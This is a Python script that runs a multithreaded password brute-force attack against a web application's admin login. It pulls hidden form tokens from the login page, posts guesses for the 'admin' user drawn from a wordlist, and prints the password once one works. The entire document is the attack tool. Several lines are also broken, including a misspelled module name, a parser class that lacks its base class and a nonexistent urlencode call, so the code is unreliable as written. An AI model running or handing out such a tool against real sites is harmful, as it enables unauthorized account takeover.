import urllib.request
import http.cookiejar
import threading
import sys
import queue
from html.parser import HTMLParser

threads = 10
username = "admin"
wordlist = "/home/strike/Downloads/SVNDigger/all.txt"
resume = None
target_url = input("Enter URL: ")
target_post = target_url 
username_field = "username"
password_field = "passwd"
success_check = "Administration - Control Panel"

class Bruter(object):
	def __init__(self, username, words):
		self.username = username
		self.password_q = words
		self.found = False
		print("[+] Finish setting up for: %s" % (username))
	
	def run_bruteforce(self):
		for i in range(threads):
			t = threading.Thread(target=self.web_bruter)
			t.start()
			
	def web_bruter(self):
		while not self.password_q.empty() and not self.found:
			brute = self.password_q.get().rstrip()
			jar = http.cookiejar.FileCookieJar("cookies")
			opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
			response = opener.open(target_url)
			page = response.read()
			print("Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))
			parser = BruteParser()
			parser.feed(page)
			post_tags = parser.tag_results
			post_tags[username_field] = self.username
			post_tags[password_field] = brute
			login_data = urllib.request.urlencode(post_tags)
			login_response = opener.open(target_post, login_data)
			login_result = login_response.read()
			if success_check in login_result:
				self.found = True
				print("[+] Brute Force Attack Completed")
				print("[+] Username: %s" % (username))
				print("[+] Password: %s" % (brute))
				print("[*] Waiting for other threads to exit...")
				
class BruteParser():
	def __init__(self):
		htnl.parser.HTMLParser.__init__(self)
		self.tag_results = {}
	
	def handle_starttag(self, tag, attrs):
		if tag == "input":
			tag_name = None
			tag_value = None
			for name, value in attrs:
				if name == "name":
					tag_name = value
				
				if name == "value":
					tag_value = value
			
			if tag_name is not None:
				self.tag_results[tag_name] = value
				
def build_wordlist(wordlist):
	print("[*] Building Wordlist")
	fd = open(wordlist,"r")
	raw_words = [line.rstrip('\n') for line in fd]
	fd.close()
	word = raw_words
	found_resume = False
	words = queue.Queue()
	for word in raw_words:
		if resume:
			if found_resume:
				words.put(word)
			else:
				if word == resume:
					found_resume = True
					print("[*] Resuming wordlist form: %s" % (resume))
		
		else:
			words.put(word)
	
	print("[+] Wordlist Build\n")
	return words

words = build_wordlist(wordlist)
bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()
